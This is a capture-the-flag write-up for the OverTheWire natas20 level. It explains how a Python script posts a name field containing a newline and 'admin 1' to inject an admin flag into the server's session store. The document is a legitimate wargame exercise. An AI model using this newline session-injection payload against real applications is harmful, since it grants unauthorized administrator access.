# natas20

For this problem, the source code has lot of rubbish written but we must focus on satisfying one key line which is -
```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
...
}
```
Here it says we should have Session name as admin and session's admin value also 1. To achieve this, lets understand the below code-
```python
import requests

url = 'http://natas20.natas.labs.overthewire.org/index.php?debug'
auth = ('natas20', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Create a new session and inject our payload
data = {'name': 'admin\nadmin 1'}
response = session.post(url, data=data)

# Step 2: Use the same session to view the page again
response = session.get(url)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```
This script first creates a new session and sends a POST request with a payload that injects a new line and 'admin 1' into the 'name' parameter. This causes the server to treat 'admin 1' as a separate session variable when it reads the session data. Then, it sends a GET request with the same session to view the page again. If the server treats 'admin 1' as a session variable, it will consider the user to be an admin.